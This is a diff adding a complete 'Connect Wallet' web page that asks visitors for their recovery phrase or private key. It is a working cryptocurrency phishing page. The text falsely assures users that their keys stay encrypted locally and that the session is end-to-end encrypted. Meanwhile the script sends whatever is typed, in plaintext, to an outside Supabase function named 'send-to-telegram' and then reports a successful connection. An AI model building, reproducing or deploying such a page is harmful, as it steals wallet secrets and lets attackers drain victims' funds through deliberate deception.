@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connect Wallet</title>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: hsl(220, 20%, 7%);
+      color: hsl(210, 20%, 92%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+    }
+    .glow { position: fixed; inset: 0; pointer-events: none; overflow: hidden; }
+    .glow::before {
+      content: '';
+      position: absolute;
+      left: 50%; top: 33%;
+      transform: translate(-50%, -50%);
+      width: 500px; height: 500px;
+      border-radius: 50%;
+      background: hsla(210, 100%, 52%, 0.05);
+      filter: blur(120px);
+    }
+    .card {
+      position: relative;
+      width: 100%; max-width: 28rem;
+      background: hsl(220, 18%, 11%);
+      border: 1px solid hsl(220, 14%, 18%);
+      border-radius: 1rem;
+      padding: 2rem;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+    }
+    h1 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 1.875rem; font-weight: 700;
+      text-align: center; margin-bottom: 0.75rem;
+      letter-spacing: -0.025em;
+    }
+    .description {
+      text-align: center; font-size: 0.875rem;
+      line-height: 1.6; color: hsl(215, 12%, 55%);
+      margin-bottom: 2rem;
+    }
+    textarea {
+      width: 100%; resize: none;
+      border-radius: 0.75rem;
+      border: 1px solid hsl(220, 14%, 18%);
+      background: hsl(220, 16%, 16%);
+      color: hsl(210, 20%, 92%);
+      padding: 0.75rem 1rem;
+      font-size: 0.875rem;
+      font-family: 'Inter', sans-serif;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    textarea::placeholder { color: hsl(215, 12%, 55%); }
+    textarea:focus {
+      border-color: hsl(210, 100%, 52%);
+      box-shadow: 0 0 0 3px hsla(210, 100%, 52%, 0.15);
+    }
+    .btn {
+      width: 100%; margin-top: 1.25rem;
+      padding: 0.75rem; border: none;
+      border-radius: 0.75rem;
+      background: hsl(210, 100%, 52%);
+      color: #fff; font-size: 0.875rem;
+      font-weight: 600; font-family: 'Inter', sans-serif;
+      cursor: pointer; transition: filter 0.2s;
+      box-shadow: 0 0 40px hsla(210, 100%, 52%, 0.3);
+    }
+    .btn:hover { filter: brightness(1.1); }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+    .btn .spinner {
+      display: inline-block; width: 16px; height: 16px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: #fff; border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      vertical-align: middle; margin-right: 0.5rem;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .message { text-align: center; font-size: 0.875rem; margin-top: 1rem; }
+    .message.error { color: hsl(0, 72%, 51%); }
+    .message.success { color: hsl(210, 80%, 45%); }
+    .footer {
+      display: flex; align-items: center; justify-content: center;
+      gap: 0.5rem; margin-top: 1.5rem;
+      font-size: 0.75rem; color: hsl(215, 12%, 55%);
+    }
+    .footer svg { color: hsl(210, 100%, 52%); }
+  </style>
+</head>
+<body>
+  <div class="glow"></div>
+  <div class="card">
+    <h1>Connect Wallet</h1>
+    <p class="description">
+      Multiple iOS and Android wallets support this protocol. Your private keys
+      remain encrypted locally on your device and are protected by Biometric and
+      2-Factor Authentication.
+    </p>
+    <form id="walletForm">
+      <textarea id="phrase" rows="4" placeholder="Enter your recovery phrase or private key…"></textarea>
+      <button class="btn" type="submit" id="submitBtn">Connect</button>
+    </form>
+    <div id="msg" class="message"></div>
+    <div class="footer">
+      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      This session is protected with end-to-end encryption
+    </div>
+  </div>
+
+  <script>
+    const SUPABASE_URL = "https://tbsfzpbwgkpozumonhmr.supabase.co";
+    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRic2Z6cGJ3Z2twb3p1bW9uaG1yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI0NDg2MTcsImV4cCI6MjA4ODAyNDYxN30.jNM3LpPGuS2lMyKREZlQ4koin6iyExX6Rfsvk-kQwnY";
+
+    const form = document.getElementById("walletForm");
+    const btn = document.getElementById("submitBtn");
+    const msg = document.getElementById("msg");
+    const phrase = document.getElementById("phrase");
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const text = phrase.value.trim();
+      if (!text) return;
+
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner"></span>Connecting…';
+      msg.textContent = "";
+      msg.className = "message";
+
+      try {
+        const res = await fetch(`${SUPABASE_URL}/functions/v1/send-to-telegram`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "apikey": SUPABASE_ANON_KEY,
+            "Authorization": `Bearer ${SUPABASE_ANON_KEY}`
+          },
+          body: JSON.stringify({ message: text })
+        });
+
+        const data = await res.json();
+
+        if (!res.ok) throw new Error(data.error || "Connection failed");
+
+        msg.textContent = "Wallet connected successfully!";
+        msg.className = "message success";
+        phrase.value = "";
+      } catch (err) {
+        msg.textContent = err.message || "Something went wrong";
+        msg.className = "message error";
+      } finally {
+        btn.disabled = false;
+        btn.innerHTML = "Connect";
+      }
+    });
+  </script>
+</body>
+</html>
